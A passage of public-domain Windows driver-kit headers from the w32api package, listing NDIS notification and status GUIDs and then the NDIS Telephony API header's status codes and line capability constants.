DEFINE_GUID(GUID_NDIS_NOTIFY_ADAPTER_REMOVAL, 0x981f2d80, 0xb1f3, 0x11d0, 0x8d, 0xd7, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_NOTIFY_BIND, 0x5413531c, 0xb1f3, 0x11d0, 0x8d, 0xd7, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_NOTIFY_DEVICE_POWER_OFF, 0x81bc8189, 0xb026, 0x46ab, 0xb9, 0x64, 0xf1, 0x82, 0xe3, 0x42, 0x93, 0x4e);
DEFINE_GUID(GUID_NDIS_NOTIFY_DEVICE_POWER_OFF_EX, 0x4159353c, 0x5cd7, 0x42ce, 0x8f, 0xe4, 0xa4, 0x5a, 0x23, 0x80, 0xcc, 0x4f);
DEFINE_GUID(GUID_NDIS_NOTIFY_DEVICE_POWER_ON, 0x5f81cfd0, 0xf046, 0x4342, 0xaf, 0x61, 0x89, 0x5a, 0xce, 0xda, 0xef, 0xd9);
DEFINE_GUID(GUID_NDIS_NOTIFY_DEVICE_POWER_ON_EX, 0x2b440188, 0x92ac, 0x4f60, 0x9b, 0x2d, 0x20, 0xa3, 0x0c, 0xbb, 0x6b, 0xbe);
DEFINE_GUID(GUID_NDIS_NOTIFY_FILTER_ARRIVAL, 0x0b6d3c89, 0x5917, 0x43ca, 0xb5, 0x78, 0xd0, 0x1a, 0x79, 0x67, 0xc4, 0x1c);
DEFINE_GUID(GUID_NDIS_NOTIFY_FILTER_REMOVAL, 0x1f177cd9, 0x5955, 0x4721, 0x9f, 0x6a, 0x78, 0xeb, 0xdf, 0xae, 0xf8, 0x89);
DEFINE_GUID(GUID_NDIS_NOTIFY_UNBIND, 0x6e3ce1ec, 0xb1f3, 0x11d0, 0x8d, 0xd7, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_NOTIFY_VC_ARRIVAL, 0x182f9e0c, 0xb1f3, 0x11d0, 0x8d, 0xd7, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_NOTIFY_VC_REMOVAL, 0x981f2d79, 0xb1f3, 0x11d0, 0x8d, 0xd7, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_PM_ACTIVE_CAPABILITIES, 0xb2cf76e3, 0xb3ae, 0x4394, 0xa0, 0x1f, 0x33, 0x8c, 0x98, 0x70, 0xe9, 0x39);
DEFINE_GUID(GUID_NDIS_PM_ADMIN_CONFIG, 0x1528d111, 0x708a, 0x4ca4, 0x92, 0x15, 0xc0, 0x57, 0x71, 0x16, 0x1c, 0xda);
DEFINE_GUID(GUID_NDIS_RECEIVE_FILTER_ENUM_FILTERS, 0x3f2c141d, 0x83bc, 0x11dd, 0x94, 0xb8, 0x00, 0x1d, 0x09, 0x16, 0x2b, 0xc3);
DEFINE_GUID(GUID_NDIS_RECEIVE_FILTER_ENUM_QUEUES, 0x3f2c141b, 0x83bc, 0x11dd, 0x94, 0xb8, 0x00, 0x1d, 0x09, 0x16, 0x2b, 0xc3);
DEFINE_GUID(GUID_NDIS_RECEIVE_FILTER_GLOBAL_PARAMETERS, 0x3f2c141a, 0x83bc, 0x11dd, 0x94, 0xb8, 0x00, 0x1d, 0x09, 0x16, 0x2b, 0xc3);
DEFINE_GUID(GUID_NDIS_RECEIVE_FILTER_HARDWARE_CAPABILITIES, 0x3f2c1419, 0x83bc, 0x11dd, 0x94, 0xb8, 0x00, 0x1d, 0x09, 0x16, 0x2b, 0xc3);
DEFINE_GUID(GUID_NDIS_RECEIVE_FILTER_PARAMETERS, 0x3f2c141e, 0x83bc, 0x11dd, 0x94, 0xb8, 0x00, 0x1d, 0x09, 0x16, 0x2b, 0xc3);
DEFINE_GUID(GUID_NDIS_RECEIVE_FILTER_QUEUE_PARAMETERS, 0x3f2c141c, 0x83bc, 0x11dd, 0x94, 0xb8, 0x00, 0x1d, 0x09, 0x16, 0x2b, 0xc3);
DEFINE_GUID(GUID_NDIS_RECEIVE_SCALE_CAPABILITIES, 0x26c28774, 0x4252, 0x48fe, 0xa6, 0x10, 0xa5, 0x8a, 0x39, 0x8c, 0x0e, 0xb1);
DEFINE_GUID(GUID_NDIS_RSS_ENABLED, 0x9565cd55, 0x3402, 0x4e32, 0xa5, 0xb6, 0x2f, 0x14, 0x3f, 0x2f, 0x2c, 0x30);
DEFINE_GUID(GUID_NDIS_STATUS_DOT11_ASSOCIATION_COMPLETION, 0x458bbea7, 0x45a4, 0x4ae2, 0xb1, 0x76, 0xe5, 0x1f, 0x96, 0xfc, 0x05, 0x68);
DEFINE_GUID(GUID_NDIS_STATUS_DOT11_ASSOCIATION_START, 0x3927843b, 0x6980, 0x4b48, 0xb1, 0x5b, 0x4d, 0xe5, 0x09, 0x77, 0xac, 0x40);
DEFINE_GUID(GUID_NDIS_STATUS_DOT11_CONNECTION_COMPLETION, 0x96efd9c9, 0x7f1b, 0x4a89, 0xbc, 0x04, 0x3e, 0x9e, 0x27, 0x17, 0x65, 0xf1);
DEFINE_GUID(GUID_NDIS_STATUS_DOT11_CONNECTION_START, 0x7b74299d, 0x998f, 0x4454, 0xad, 0x08, 0xc5, 0xaf, 0x28, 0x57, 0x6d, 0x1b);
DEFINE_GUID(GUID_NDIS_STATUS_DOT11_DISASSOCIATION, 0x3fbeb6fc, 0x0fe2, 0x43fd, 0xb2, 0xad, 0xbd, 0x99, 0xb5, 0xf9, 0x3e, 0x13);
DEFINE_GUID(GUID_NDIS_STATUS_DOT11_LINK_QUALITY, 0xa3285184, 0xea99, 0x48ed, 0x82, 0x5e, 0xa4, 0x26, 0xb1, 0x1c, 0x27, 0x54);
DEFINE_GUID(GUID_NDIS_STATUS_DOT11_MPDU_MAX_LENGTH_CHANGED, 0x1d6560ec, 0x8e48, 0x4a3e, 0x9f, 0xd5, 0xa0, 0x1b, 0x69, 0x8d, 0xb6, 0xc5);
DEFINE_GUID(GUID_NDIS_STATUS_DOT11_PHY_STATE_CHANGED, 0xdeb45316, 0x71b5, 0x4736, 0xbd, 0xef, 0x0a, 0x9e, 0x9f, 0x4e, 0x62, 0xdc);
DEFINE_GUID(GUID_NDIS_STATUS_DOT11_PMKID_CANDIDATE_LIST, 0x26d8b8f6, 0xdb82, 0x49eb, 0x8b, 0xf3, 0x4c, 0x13, 0x0e, 0xf0, 0x69, 0x50);
DEFINE_GUID(GUID_NDIS_STATUS_DOT11_ROAMING_COMPLETION, 0xdd9d47d1, 0x282b, 0x41e4, 0xb9, 0x24, 0x66, 0x36, 0x88, 0x17, 0xfc, 0xd3);
DEFINE_GUID(GUID_NDIS_STATUS_DOT11_ROAMING_START, 0xb2412d0d, 0x26c8, 0x4f4e, 0x93, 0xdf, 0xf7, 0xb7, 0x05, 0xa0, 0xb4, 0x33);
DEFINE_GUID(GUID_NDIS_STATUS_DOT11_SCAN_CONFIRM, 0x8500591e, 0xa0c7, 0x4efb, 0x93, 0x42, 0xb6, 0x74, 0xb0, 0x02, 0xcb, 0xe6);
DEFINE_GUID(GUID_NDIS_STATUS_DOT11_TKIPMIC_FAILURE, 0x442c2ae4, 0x9bc5, 0x4b90, 0xa8, 0x89, 0x45, 0x5e, 0xf2, 0x20, 0xf4, 0xee);
DEFINE_GUID(GUID_NDIS_STATUS_HD_SPLIT_CURRENT_CONFIG, 0x6c744b0e, 0xee9c, 0x4205, 0x90, 0xa2, 0x01, 0x5f, 0x6d, 0x65, 0xf4, 0x03);
DEFINE_GUID(GUID_NDIS_STATUS_LINK_SPEED_CHANGE, 0x981f2d85, 0xb1f3, 0x11d0, 0x8d, 0xd7, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_STATUS_LINK_STATE, 0x64c6f797, 0x878c, 0x4311, 0x92, 0x46, 0x65, 0xdb, 0xa8, 0x9c, 0x3a, 0x61);
DEFINE_GUID(GUID_NDIS_STATUS_MEDIA_CONNECT, 0x981f2d7d, 0xb1f3, 0x11d0, 0x8d, 0xd7, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_STATUS_MEDIA_DISCONNECT, 0x981f2d7e, 0xb1f3, 0x11d0, 0x8d, 0xd7, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_STATUS_MEDIA_SPECIFIC_INDICATION, 0x981f2d84, 0xb1f3, 0x11d0, 0x8d, 0xd7, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_STATUS_NETWORK_CHANGE, 0xca8a56f9, 0xce81, 0x40e6, 0xa7, 0x0f, 0xa0, 0x67,0xa4,0x76, 0xe9, 0xe9);
DEFINE_GUID(GUID_NDIS_STATUS_OPER_STATUS, 0xf917b663, 0x845e, 0x4d3d, 0xb6, 0xd4, 0x15, 0xeb, 0x27, 0xaf, 0x81, 0xc5);
DEFINE_GUID(GUID_NDIS_STATUS_PACKET_FILTER, 0xd47c5407, 0x2e75, 0x46dd, 0x81, 0x46, 0x1d, 0x7e, 0xd2, 0xd6, 0xab, 0x1d);
DEFINE_GUID(GUID_NDIS_STATUS_PORT_STATE, 0x1dac0dfe, 0x43e5, 0x44b7, 0xb7, 0x59, 0x7b, 0xf4, 0x6d, 0xe3, 0x2e, 0x81);
DEFINE_GUID(GUID_NDIS_STATUS_RESET_END, 0x981f2d77, 0xb1f3, 0x11d0, 0x8d, 0xd7, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_STATUS_RESET_START, 0x981f2d76, 0xb1f3, 0x11d0, 0x8d, 0xd7, 0x00, 0xc0, 0x4f, 0xc3, 0x35, 0x8c);
DEFINE_GUID(GUID_NDIS_STATUS_TASK_OFFLOAD_CURRENT_CONFIG, 0x45049fc6, 0x54d8, 0x40c8, 0x9c, 0x3d, 0xb0, 0x11, 0xc4, 0xe7, 0x15, 0xbc);
DEFINE_GUID(GUID_NDIS_STATUS_TASK_OFFLOAD_HARDWARE_CAPABILITIES, 0xb6b8158b, 0x217c, 0x4b2a, 0xbe, 0x86, 0x6a, 0x04, 0xbe, 0xea, 0x65, 0xb8);
DEFINE_GUID(GUID_NDIS_STATUS_TCP_CONNECTION_OFFLOAD_CURRENT_CONFIG, 0xf8edaeff, 0x24e4, 0x4ae6, 0xa4, 0x13, 0x0b, 0x27, 0xf7, 0x6b, 0x24, 0x3d);
DEFINE_GUID(GUID_NDIS_STATUS_TCP_CONNECTION_OFFLOAD_HARDWARE_CAPABILITIES, 0x391969b6, 0x402c, 0x43bf, 0x89, 0x22, 0x39, 0xea, 0xe0, 0xda, 0x1b, 0xb5);
DEFINE_GUID(GUID_NDIS_TCP_CONNECTION_OFFLOAD_CURRENT_CONFIG, 0x2ee6aef1, 0x0851, 0x458b, 0xbf, 0x0d, 0x79, 0x23, 0x43, 0xd1, 0xcd, 0xe1);
DEFINE_GUID(GUID_NDIS_TCP_CONNECTION_OFFLOAD_HARDWARE_CAPABILITIES, 0x8ce71f2c, 0xd63a, 0x4390, 0xa4, 0x87, 0x18, 0xfa, 0x47, 0x26, 0x2c, 0xeb);
DEFINE_GUID(GUID_NDIS_TCP_OFFLOAD_CURRENT_CONFIG, 0x68542fed, 0x5c74, 0x461e, 0x89, 0x34, 0x91, 0xc6, 0xf9, 0xc6, 0x09, 0x60);
DEFINE_GUID(GUID_NDIS_TCP_OFFLOAD_HARDWARE_CAPABILITIES, 0xcd5f1102, 0x590f, 0x4ada, 0xab, 0x65, 0x5b, 0x31, 0xb1, 0xdc, 0x01, 0x72);
DEFINE_GUID(GUID_NDIS_TCP_OFFLOAD_PARAMETERS, 0x8ead9a22, 0x7f69, 0x4bc6, 0x94, 0x9a, 0xc8, 0x18, 0x7b, 0x07, 0x4e, 0x61);
DEFINE_GUID(GUID_NDIS_WAKE_ON_MAGIC_PACKET_ONLY, 0xa14f1c97, 0x8839, 0x4f8a, 0x99, 0x96, 0xa2, 0x89, 0x96, 0xeb, 0xbf, 0x1d);
DEFINE_GUID(GUID_NIC_SWITCH_CURRENT_CAPABILITIES, 0xe76fdaf3, 0x0be7, 0x4d95, 0x87, 0xe9, 0x5a, 0xea, 0xd4, 0xb5, 0x90, 0xe9);
DEFINE_GUID(GUID_NIC_SWITCH_HARDWARE_CAPABILITIES, 0x37cab40c, 0xd1e8, 0x4301, 0x8c, 0x1d, 0x58, 0x46, 0x5e, 0x0c, 0x4c, 0x0f);
DEFINE_GUID(GUID_PM_ADD_PROTOCOL_OFFLOAD, 0x0c06c112, 0x0d93, 0x439b, 0x9e, 0x6d, 0x26, 0xbe, 0x13, 0x0c, 0x97, 0x84);
DEFINE_GUID(GUID_PM_ADD_WOL_PATTERN, 0x6fc83ba7, 0x52bc, 0x4faa, 0xac, 0x51, 0x7d, 0x2f, 0xfe, 0x63, 0xba, 0x90);
DEFINE_GUID(GUID_PM_CURRENT_CAPABILITIES, 0x3abdbd14, 0xd44a, 0x4a3f, 0x9a, 0x63, 0xa0, 0xa4, 0x2a, 0x51, 0xb1, 0x31);
DEFINE_GUID(GUID_PM_GET_PROTOCOL_OFFLOAD, 0xa6435cd9, 0x149f, 0x498e, 0x95, 0x1b, 0x2d, 0x94, 0xbe, 0xa3, 0xe3, 0xa3);
DEFINE_GUID(GUID_PM_HARDWARE_CAPABILITIES, 0xece5360d, 0x3291, 0x4a6e, 0x80, 0x44, 0x00, 0x51, 0x1f, 0xed, 0x27, 0xee);
DEFINE_GUID(GUID_PM_PARAMETERS, 0x560245d2, 0xe251, 0x409c, 0xa2, 0x80, 0x31, 0x19, 0x35, 0xbe, 0x3b, 0x28);
DEFINE_GUID(GUID_PM_PROTOCOL_OFFLOAD_LIST, 0x736ec5ab, 0xca8f, 0x4043, 0xbb, 0x58, 0xda, 0x40, 0x2a, 0x48, 0xd9, 0xcc);
DEFINE_GUID(GUID_PM_REMOVE_PROTOCOL_OFFLOAD, 0xdecd7be2, 0xa6b0, 0x43ca, 0xae, 0x45, 0xd0, 0x00, 0xd2, 0x0e, 0x52, 0x65);
DEFINE_GUID(GUID_PM_REMOVE_WOL_PATTERN, 0xa037a915, 0xc6ca, 0x4322, 0xb3, 0xe3, 0xef, 0x75, 0x4e, 0xc4, 0x98, 0xdc);
DEFINE_GUID(GUID_PM_WOL_PATTERN_LIST, 0x4022be37, 0x7ee2, 0x47be, 0xa5, 0xa5, 0x05, 0x0f, 0xc7, 0x9a, 0xfc, 0x75);
DEFINE_GUID(GUID_RECEIVE_FILTER_CURRENT_CAPABILITIES, 0x4054e80f, 0x2bc1, 0x4ccc, 0xb0, 0x33, 0x4a, 0xbc, 0x0c, 0x4a, 0x1e, 0x8c);
DEFINE_GUID(GUID_STATUS_MEDIA_SPECIFIC_INDICATION_EX, 0xaaacfca7, 0x954a, 0x4632, 0xa1, 0x6e, 0xa8, 0xa6, 0x37, 0x93, 0xa9, 0xe5);
DEFINE_GUID(UNSPECIFIED_NETWORK_GUID, 0x12ba5bde, 0x143e, 0x4c0d, 0xb6, 0x6d, 0x23, 0x79, 0xbb, 0x14, 0x19, 0x13);

#ifdef __cplusplus
}
#endif

```

`include/ddk/ndistapi.h`:

```h
/*
 * ndistapi.h
 *
 * NDIS Telephony API
 *
 * This file is part of the w32api package.
 *
 * Contributors:
 *   Created by Casper S. Hornstrup <chorns@users.sourceforge.net>
 *
 * THIS SOFTWARE IS NOT COPYRIGHTED
 *
 * This source code is offered for use in the public domain. You may
 * use, modify or distribute it freely.
 *
 * This code is distributed in the hope that it will be useful but
 * WITHOUT ANY WARRANTY. ALL WARRANTIES, EXPRESS OR IMPLIED ARE HEREBY
 * DISCLAIMED. This includes but is not limited to warranties of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 */

#pragma once

#ifndef _NDIS_TAPI_
#define _NDIS_TAPI_

#include "ndis.h"

#ifdef __cplusplus
extern "C" {
#endif

#ifndef NDIS_TAPI_CURRENT_VERSION
#define NDIS_TAPI_CURRENT_VERSION         0x00010003
#endif

typedef ULONG_PTR HTAPI_LINE;
typedef ULONG_PTR HDRV_LINE;
typedef ULONG_PTR HTAPI_CALL;
typedef ULONG_PTR HDRV_CALL;

#define NDIS_STATUS_TAPI_ADDRESSBLOCKED               ((NDIS_STATUS)0xC0012000L)
#define NDIS_STATUS_TAPI_BEARERMODEUNAVAIL            ((NDIS_STATUS)0xC0012001L)
#define NDIS_STATUS_TAPI_CALLUNAVAIL                  ((NDIS_STATUS)0xC0012002L)
#define NDIS_STATUS_TAPI_DIALBILLING                  ((NDIS_STATUS)0xC0012003L)
#define NDIS_STATUS_TAPI_DIALDIALTONE                 ((NDIS_STATUS)0xC0012004L)
#define NDIS_STATUS_TAPI_DIALPROMPT                   ((NDIS_STATUS)0xC0012005L)
#define NDIS_STATUS_TAPI_DIALQUIET                    ((NDIS_STATUS)0xC0012006L)
#define NDIS_STATUS_TAPI_INCOMPATIBLEEXTVERSION       ((NDIS_STATUS)0xC0012007L)
#define NDIS_STATUS_TAPI_INUSE                        ((NDIS_STATUS)0xC0012008L)
#define NDIS_STATUS_TAPI_INVALADDRESS                 ((NDIS_STATUS)0xC0012009L)
#define NDIS_STATUS_TAPI_INVALADDRESSID               ((NDIS_STATUS)0xC001200AL)
#define NDIS_STATUS_TAPI_INVALADDRESSMODE             ((NDIS_STATUS)0xC001200BL)
#define NDIS_STATUS_TAPI_INVALBEARERMODE              ((NDIS_STATUS)0xC001200CL)
#define NDIS_STATUS_TAPI_INVALCALLHANDLE              ((NDIS_STATUS)0xC001200DL)
#define NDIS_STATUS_TAPI_INVALCALLPARAMS              ((NDIS_STATUS)0xC001200EL)
#define NDIS_STATUS_TAPI_INVALCALLSTATE               ((NDIS_STATUS)0xC001200FL)
#define NDIS_STATUS_TAPI_INVALDEVICECLASS             ((NDIS_STATUS)0xC0012010L)
#define NDIS_STATUS_TAPI_INVALLINEHANDLE              ((NDIS_STATUS)0xC0012011L)
#define NDIS_STATUS_TAPI_INVALLINESTATE               ((NDIS_STATUS)0xC0012012L)
#define NDIS_STATUS_TAPI_INVALMEDIAMODE               ((NDIS_STATUS)0xC0012013L)
#define NDIS_STATUS_TAPI_INVALRATE                    ((NDIS_STATUS)0xC0012014L)
#define NDIS_STATUS_TAPI_NODRIVER                     ((NDIS_STATUS)0xC0012015L)
#define NDIS_STATUS_TAPI_OPERATIONUNAVAIL             ((NDIS_STATUS)0xC0012016L)
#define NDIS_STATUS_TAPI_RATEUNAVAIL                  ((NDIS_STATUS)0xC0012017L)
#define NDIS_STATUS_TAPI_RESOURCEUNAVAIL              ((NDIS_STATUS)0xC0012018L)
#define NDIS_STATUS_TAPI_STRUCTURETOOSMALL            ((NDIS_STATUS)0xC0012019L)
#define NDIS_STATUS_TAPI_USERUSERINFOTOOBIG           ((NDIS_STATUS)0xC001201AL)
#define NDIS_STATUS_TAPI_ALLOCATED                    ((NDIS_STATUS)0xC001201BL)
#define NDIS_STATUS_TAPI_INVALADDRESSSTATE            ((NDIS_STATUS)0xC001201CL)
#define NDIS_STATUS_TAPI_INVALPARAM                   ((NDIS_STATUS)0xC001201DL)
#define NDIS_STATUS_TAPI_NODEVICE                     ((NDIS_STATUS)0xC001201EL)
#define NDIS_STATUS_TAPI_DISCONNECTMODE_NORMAL        ((NDIS_STATUS)0xC0012020L)
#define NDIS_STATUS_TAPI_DISCONNECTMODE_UNKNOWN       ((NDIS_STATUS)0xC0012021L)
#define NDIS_STATUS_TAPI_DISCONNECTMODE_REJECT        ((NDIS_STATUS)0xC0012022L)
#define NDIS_STATUS_TAPI_DISCONNECTMODE_PICKUP        ((NDIS_STATUS)0xC0012023L)
#define NDIS_STATUS_TAPI_DISCONNECTMODE_FORWARDED     ((NDIS_STATUS)0xC0012024L)
#define NDIS_STATUS_TAPI_DISCONNECTMODE_BUSY          ((NDIS_STATUS)0xC0012025L)
#define NDIS_STATUS_TAPI_DISCONNECTMODE_NOANSWER      ((NDIS_STATUS)0xC0012026L)
#define NDIS_STATUS_TAPI_DISCONNECTMODE_BADADDRESS    ((NDIS_STATUS)0xC0012027L)
#define NDIS_STATUS_TAPI_DISCONNECTMODE_UNREACHABLE   ((NDIS_STATUS)0xC0012028L)
#define NDIS_STATUS_TAPI_DISCONNECTMODE_CONGESTION    ((NDIS_STATUS)0xC0012029L)
#define NDIS_STATUS_TAPI_DISCONNECTMODE_INCOMPATIBLE  ((NDIS_STATUS)0xC001202AL)
#define NDIS_STATUS_TAPI_DISCONNECTMODE_UNAVAIL       ((NDIS_STATUS)0xC001202BL)
#define NDIS_STATUS_TAPI_RECV_DIGIT                   ((NDIS_STATUS)0x40010020L)

#define LINE_ADDRESSSTATE                 0L
#define LINE_CALLINFO                     1L
#define LINE_CALLSTATE                    2L
#define LINE_CLOSE                        3L
#define LINE_DEVSPECIFIC                  4L
#define LINE_DEVSPECIFICFEATURE           5L
#define LINE_GATHERDIGITS                 6L
#define LINE_GENERATE                     7L
#define LINE_LINEDEVSTATE                 8L
#define LINE_MONITORDIGITS                9L
#define LINE_MONITORMEDIA                 10L
#define LINE_MONITORTONE                  11L
#define LINE_REPLY                        12L
#define LINE_REQUEST                      13L
#define LINE_CREATE                       19L
#if (NDIS_TAPI_CURRENT_VERSION >= 0x00020000)
#define LINE_AGENTSPECIFIC                21L
#define LINE_AGENTSTATUS                  22L
#define LINE_APPNEWCALL                   23L
#define LINE_PROXYREQUEST                 24L
#define LINE_REMOVE                       25L
#endif
#if (NDIS_TAPI_CURRENT_VERSION >= 0x00020002)
#define LINE_AGENTSESSIONSTATUS           27L
#define LINE_QUEUESTATUS                  28L
#define LINE_AGENTSTATUSEX                29L
#define LINE_GROUPSTATUS                  30L
#define LINE_PROXYSTATUS                  31L
#endif
#if (TAPI_CURRENT_VERSION >= 0x00030000)
#define LINE_APPNEWCALLHUB                32L
#define LINE_CALLHUBCLOSE                 33L
#define LINE_DEVSPECIFICEX                34L
#endif

#define TSPI_MESSAGE_BASE                 500L
#define LINE_NEWCALL                      TSPI_MESSAGE_BASE
#define LINE_CALLDEVSPECIFIC              (TSPI_MESSAGE_BASE + 1L)
#define STRINGFORMAT_ASCII                0x00000001
#define STRINGFORMAT_DBCS                 0x00000002
#define STRINGFORMAT_UNICODE              0x00000003
#define STRINGFORMAT_BINARY               0x00000004

#define LINEADDRCAPFLAGS_FWDNUMRINGS      0x00000001
#define LINEADDRCAPFLAGS_PICKUPGROUPID    0x00000002
#define LINEADDRCAPFLAGS_SECURE           0x00000004
#define LINEADDRCAPFLAGS_BLOCKIDDEFAULT   0x00000008
#define LINEADDRCAPFLAGS_BLOCKIDOVERRIDE  0x00000010
#define LINEADDRCAPFLAGS_DIALED           0x00000020
#define LINEADDRCAPFLAGS_ORIGOFFHOOK      0x00000040
#define LINEADDRCAPFLAGS_DESTOFFHOOK      0x00000080
#define LINEADDRCAPFLAGS_FWDCONSULT       0x00000100
#define LINEADDRCAPFLAGS_SETUPCONFNULL    0x00000200
#define LINEADDRCAPFLAGS_AUTORECONNECT    0x00000400
#define LINEADDRCAPFLAGS_COMPLETIONID     0x00000800
#define LINEADDRCAPFLAGS_TRANSFERHELD     0x00001000
#define LINEADDRCAPFLAGS_TRANSFERMAKE     0x00002000
#define LINEADDRCAPFLAGS_CONFERENCEHELD   0x00004000
#define LINEADDRCAPFLAGS_CONFERENCEMAKE   0x00008000
#define LINEADDRCAPFLAGS_PARTIALDIAL      0x00010000
#define LINEADDRCAPFLAGS_FWDSTATUSVALID   0x00020000
#define LINEADDRCAPFLAGS_FWDINTEXTADDR    0x00040000
#define LINEADDRCAPFLAGS_FWDBUSYNAADDR    0x00080000
#define LINEADDRCAPFLAGS_ACCEPTTOALERT    0x00100000
#define LINEADDRCAPFLAGS_CONFDROP         0x00200000
#define LINEADDRCAPFLAGS_PICKUPCALLWAIT   0x00400000
#if (NDIS_TAPI_CURRENT_VERSION >= 0x00020000)
#define LINEADDRCAPFLAGS_PREDICTIVEDIALER 0x00800000
#define LINEADDRCAPFLAGS_QUEUE            0x01000000
#define LINEADDRCAPFLAGS_ROUTEPOINT       0x02000000
#define LINEADDRCAPFLAGS_HOLDMAKESNEW     0x04000000
#define LINEADDRCAPFLAGS_NOINTERNALCALLS  0x08000000
#define LINEADDRCAPFLAGS_NOEXTERNALCALLS  0x10000000
#define LINEADDRCAPFLAGS_SETCALLINGID     0x20000000
#endif
#if (NDIS_TAPI_CURRENT_VERSION >= 0x00030000)
#define LINEADDRCAPFLAGS_ACDGROUP         0x40000000
#define LINEADDRCAPFLAGS_NOPSTNADDRESSTRANSLATION \
                                          0x80000000
#endif

#define LINEADDRESSMODE_ADDRESSID         0x00000001
#define LINEADDRESSMODE_DIALABLEADDR      0x00000002
#define LINEADDRESSSHARING_PRIVATE        0x00000001
#define LINEADDRESSSHARING_BRIDGEDEXCL    0x00000002
#define LINEADDRESSSHARING_BRIDGEDNEW     0x00000004
#define LINEADDRESSSHARING_BRIDGEDSHARED  0x00000008
#define LINEADDRESSSHARING_MONITORED      0x00000010
#define LINEADDRESSSTATE_OTHER            0x00000001
#define LINEADDRESSSTATE_DEVSPECIFIC      0x00000002
#define LINEADDRESSSTATE_INUSEZERO        0x00000004
#define LINEADDRESSSTATE_INUSEONE         0x00000008
#define LINEADDRESSSTATE_INUSEMANY        0x00000010
#define LINEADDRESSSTATE_NUMCALLS         0x00000020
#define LINEADDRESSSTATE_FORWARD          0x00000040
#define LINEADDRESSSTATE_TERMINALS        0x00000080

#if (NDIS_TAPI_CURRENT_VERSION >= 0x00030000)
#define LINEADDRESSTYPE_PHONENUMBER       0x00000001
#define LINEADDRESSTYPE_SDP               0x00000002
#define LINEADDRESSTYPE_EMAILNAME         0x00000004
#define LINEADDRESSTYPE_DOMAINNAME        0x00000008
#define LINEADDRESSTYPE_IPADDRESS         0x00000010
#endif

#define LINEADDRFEATURE_FORWARD           0x00000001
#define LINEADDRFEATURE_MAKECALL          0x00000002
#define LINEADDRFEATURE_PICKUP            0x00000004
#define LINEADDRFEATURE_SETMEDIACONTROL   0x00000008
#define LINEADDRFEATURE_SETTERMINAL       0x00000010
#define LINEADDRFEATURE_SETUPCONF         0x00000020
#define LINEADDRFEATURE_UNCOMPLETECALL    0x00000040
#define LINEADDRFEATURE_UNPARK            0x00000080
#if (NDIS_TAPI_CURRENT_VERSION >= 0x00020000)
#define LINEADDRFEATURE_PICKUPHELD        0x00000100
#define LINEADDRFEATURE_PICKUPGROUP       0x00000200
#define LINEADDRFEATURE_PICKUPDIRECT      0x00000400
#define LINEADDRFEATURE_PICKUPWAITING     0x00000800
#define LINEADDRFEATURE_FORWARDFWD        0x00001000
#define LINEADDRFEATURE_FORWARDDND        0x00002000
#endif

#define LINEANSWERMODE_NONE               0x00000001
#define LINEANSWERMODE_DROP               0x00000002
#define LINEANSWERMODE_HOLD               0x00000004

#define LINEBEARERMODE_VOICE              0x00000001
#define LINEBEARERMODE_SPEECH             0x00000002
#define LINEBEARERMODE_MULTIUSE           0x00000004
#define LINEBEARERMODE_DATA               0x00000008
#define LINEBEARERMODE_ALTSPEECHDATA      0x00000010
#define LINEBEARERMODE_NONCALLSIGNALING   0x00000020
#define LINEBEARERMODE_PASSTHROUGH        0x00000040
#if (NDIS_TAPI_CURRENT_VERSION >= 0x00020000)
#define LINEBEARERMODE_RESTRICTEDDATA     0x00000080
#endif

#define LINEBUSYMODE_STATION              0x00000001
#define LINEBUSYMODE_TRUNK                0x00000002
#define LINEBUSYMODE_UNKNOWN              0x00000004
#define LINEBUSYMODE_UNAVAIL              0x00000008

#define LINECALLCOMPLCOND_BUSY            0x00000001
#define LINECALLCOMPLCOND_NOANSWER        0x00000002

#define LINECALLCOMPLMODE_CAMPON          0x00000001
#define LINECALLCOMPLMODE_CALLBACK        0x00000002
#define LINECALLCOMPLMODE_INTRUDE         0x00000004
#define LINECALLCOMPLMODE_MESSAGE         0x00000008

#define LINECALLFEATURE_ACCEPT            0x00000001
#define LINECALLFEATURE_ADDTOCONF         0x00000002
#define LINECALLFEATURE_ANSWER            0x00000004
#define LINECALLFEATURE_BLINDTRANSFER     0x00000008
#define LINECALLFEATURE_COMPLETECALL      0x00000010
#define LINECALLFEATURE_COMPLETETRANSF    0x00000020
#define LINECALLFEATURE_DIAL              0x00000040
#define LINECALLFEATURE_DROP              0x00000080
#define LINECALLFEATURE_GATHERDIGITS      0x00000100
#define LINECALLFEATURE_GENERATEDIGITS    0x00000200
#define LINECALLFEATURE_GENERATETONE      0x00000400
#define LINECALLFEATURE_HOLD              0x00000800
#define LINECALLFEATURE_MONITORDIGITS     0x00001000
#define LINECALLFEATURE_MONITORMEDIA      0x00002000
#define LINECALLFEATURE_MONITORTONES      0x00004000
#define LINECALLFEATURE_PARK              0x00008000
#define LINECALLFEATURE_PREPAREADDCONF    0x00010000
#define LINECALLFEATURE_REDIRECT          0x00020000
#define LINECALLFEATURE_REMOVEFROMCONF    0x00040000
#define LINECALLFEATURE_SECURECALL        0x00080000
#define LINECALLFEATURE_SENDUSERUSER      0x00100000
#define LINECALLFEATURE_SETCALLPARAMS     0x00200000
#define LINECALLFEATURE_SETMEDIACONTROL   0x00400000
#define LINECALLFEATURE_SETTERMINAL       0x00800000
#define LINECALLFEATURE_SETUPCONF         0x01000000
#define LINECALLFEATURE_SETUPTRANSFER     0x02000000
#define LINECALLFEATURE_SWAPHOLD          0x04000000
#define LINECALLFEATURE_UNHOLD            0x08000000
#define LINECALLFEATURE_RELEASEUSERUSERINFO \
                                          0x10000000
